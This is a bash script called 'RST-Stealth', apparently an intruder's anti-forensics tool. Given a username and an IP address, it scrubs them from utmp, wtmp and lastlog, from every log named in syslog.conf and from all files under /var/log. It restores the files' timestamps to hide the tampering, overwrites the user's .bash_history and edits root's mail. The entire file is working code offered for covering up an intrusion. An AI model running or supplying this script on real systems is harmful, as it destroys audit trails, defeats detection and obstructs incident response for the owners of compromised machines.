#!/bin/bash
clear
ROOT_UID=0
if [ "$UID" -ne "$ROOT_UID" ]
then
  echo "    Termination of the script in 15 seconds"
  echo "    ---------------------------------------"
  echo "            You have no uid ROOT"
  echo "             Permission denied!"
  echo
  echo "Your login (`whoami`):"
  echo "`id`"
  sleep 15
  exit $E_NOTROOT
fi
rm -f /tmp/time*

if [ $# -lt 2 ]; then
  echo "################################################"
  echo "#                                              #"
  echo "#              Bad LOGIN or IP!                #"
  echo "#             ------------------               #"
  echo "#          Repeat rekeying, please.            #"
  echo "#                                              #"    
  echo "#     Example:  ./stealth login ip             #"      
  echo "################################################"
  echo 
  echo "Usage: $0 root 192.168.0.3"
  echo
 exit 1
fi

login=$1
ip=$2

if [ "$login" != "" ]; then    
 if [ "$ip" != "" ]; then
    l_f=$(echo "$login") #result who array
    ip_f=$(echo "$ip")   #ip-address
    echo "Searching for of the files (utmp,wtmp,lastlog)"
    echo "Please wait several minutes..."
    utmp_f='/var/run/utmp'
    if [ -e $utmp_f ];then
      sed -e "s/$ip_f//g" $utmp_f > $utmp_f.$$ 2>/dev/null 
      mv $utmp_f.$$ $utmp_f      
      sed -e "s/$l_f//g" $utmp_f > $utmp_f.$$ 2>/dev/null 
      mv $utmp_f.$$ $utmp_f      
    else
      utmp=$(find / -type f -name 'utmp')
      sed -e "s/$ip_f//g" $utmp > $utmp.$$ 2>/dev/null 
      mv $utmp.$$ $utmp      
      sed -e "s/$l_f//g" $utmp > $utmp.$$ 2>/dev/null 
      mv $utmp.$$ $utmp
    fi
    
    wtmp_f='/var/log/wtmp'
    if [ -e $wtmp_f ];then
      sed -e "s/$ip_f//g" $wtmp_f > $wtmp_f.$$ 2>/dev/null 
      mv $wtmp_f.$$ $wtmp_f
      sed -e "s/$l_f//g" $wtmp_f > $wtmp_f.$$ 2>/dev/null       
      mv $wtmp_f.$$ $wtmp_f
    else
      wtmp=$(find / -type f -name 'wtmp')
      sed -e "s/$ip_f//g" $wtmp > $wtmp.$$ 2>/dev/null 
      sed -e "s/$l_f//g" $wtmp > $wtmp.$$ 2>/dev/null       
      mv $wtmp.$$ $wtmp
    fi

    lastlog_f='/var/log/lastlog'
    if [ -e $lastlog_f ];then
      sed -e "s/$ip_f//g" $lastlog_f > $lastlog_f.$$ 2>/dev/null 
      mv $lastlog_f.$$ $lastlog_f
      sed -e "s/$l_f//g" $lastlog_f > $lastlog_f.$$ 2>/dev/null       
      mv $lastlog_f.$$ $lastlog_f
    else
      lastlog=$(find / -type f -name 'lastlog')
      sed -e "s/$ip_f//g" $lastlog > $lastlog.$$ 2>/dev/null 
      sed -e "s/$l_f//g" $lastlog > $lastlog.$$ 2>/dev/null       
      mv $lastlog.$$ $lastlog
    fi

clear
echo "################################################"
echo "#                                              #"
echo "#                RST-Stealth                   #"
echo "#              ---------------                 #"  
echo "#                                              #"
echo "#    Log-files (utmp,wtmp,lastlog) clearing    #"
echo "#                You Stealth!                  #"
echo "#        Continue of the work programm         #"
echo "#        Please wait several minutes...        #"
echo "#                                              #"    
echo "################################################"
echo
echo "Result command who:"
    who
    echo "processing...";sleep 2
    sys_l='/etc/syslog.conf'
    if [ -e $sys_l ]; then
      > /tmp/syslog.tmp
      sed -e '/^$/d' $sys_l | sed -e '/^#/d'|awk '{print $2}' | sed -e '/\*/d' > /tmp/syslog.$$
      mv /tmp/syslog.$$ /tmp/syslog.tmp
    else
     echo "/etc/syslog.conf does not exist or is empty, find syslog.conf."
     echo "Please wait several minutes..."
     syslog=$(find / -type f -name 'syslog.conf')
     > /tmp/syslog.tmp
     sed -e '/^$/d' $syslog | sed -e '/^#/d'|awk '{print $2}' | sed -e '/\*/d' > /tmp/syslog.$$
     mv /tmp/syslog.$$ /tmp/syslog.tmp
    fi  

    while read line_log
    do
     if [ -e $line_log ];then
       sed -e "/$ip_f/d" $line_log > $line_log.$$;mv $line_log.$$ $line_log 2>/dev/null
       sed -e "/$l_f/d" $line_log > $line_log.$$;mv $line_log.$$ $line_log 2>/dev/null
     fi
    done < /tmp/syslog.tmp 
    rm -f /tmp/syslog.tmp 2>/dev/null
    
    history=`echo $HOME`; echo "pwd" > "$history/.bash_history";echo "ls" > "$history/.bash_history"
    echo "------------------------------------------"
    echo "1. Clearing file Ok! $history/.bash_history"
    echo "Continue of the work programm..."        
    echo "------------------------------------------";echo
    sleep 1
    mail_root=$(echo "`dirname $MAIL`/root")
    if [ ! -e "$mail_root" ]
    then
       echo "File mail `basename $mail_root` is not found!"
       echo "Continue of the work programm...";echo "------------------------------";echo
    else
      if [ ! -e "$mail_root.lock" ]
      then
       mail_val=$(echo "`dirname $MAIL`/val")
       >$mail_root.lock
       u=$(ls -l $mail_root |awk '{print $3}')
       g=$(ls -l $mail_root |awk '{print $4}')
       sed -e "/$ip_f/d" $mail_root > $mail_root.$$;mv $mail_root.$$ $mail_root 2>/dev/null
       sed -e "/$l_f/d" $mail_root > $mail_root.$$;mv $mail_root.$$ $mail_root 2>/dev/null
       chown $u $mail_root;chgrp $g $mail_root
       echo "------------------------------------------"
       echo "2. Clearing file Ok! $mail_root"
       echo "Continue of the work programm..."    
       echo "------------------------------------------";echo
       echo "3. Clearing files in /var/log/*"    
       echo "process will occupy certain time"        
       echo "Please wait several minutes..."
       rm -f $mail_root.lock
       fi
    fi 
    
 cd /var/log;echo || {
 echo "Impossible move over to required catalogue" >&2
 exit $E_XCD;
 }
 echo
 directory='/var/log/'

 for file in $( find $directory -type f -name '*' | sort )
 do
   touch -r $file -m /tmp/time.$$
   sed -e "/$ip_f/d" $file > $file.$$;mv $file.$$ $file 2>/dev/null
   sed -e "/$l_f/d" $file > $file.$$;mv $file.$$ $file 2>/dev/null
   touch -r /tmp/time.$$ -m $file;rm -f /tmp/time.$$
   echo "Clearing Ok $file"
 done

 clear
 echo "################################################"
 echo "#                                              #"
 echo "#                RST-Stealth                   #"
 echo "#              ---------------                 #"  
 echo "#                                              #"
 echo "# Good luck!                                   #"
 echo "# Functioning(working) the program completed   #"
 echo "# ------------------------------------------   #"
 echo "# Home page: htp://rst.void.ru                 #"
 echo "# Free software script                         #"
 echo "# Coding: dinggo                               #"  
 echo "#                                              #" 
 echo "#                close-down                    #"    
 echo "################################################"
 sleep 1
else
  clear
  echo "################################################"
  echo "#                                              #"
  echo "#              Bad LOGIN or IP!                #"
  echo "#             ------------------               #"
  echo "# Usage:                                       #"
  echo "# $0 root 192.168.0.3                          #"
  echo "#                                              #"  
  echo "# Repeat rekeying, please.                     #"
  echo "#                                              #"    
  echo "################################################"
  echo
 fi
fi


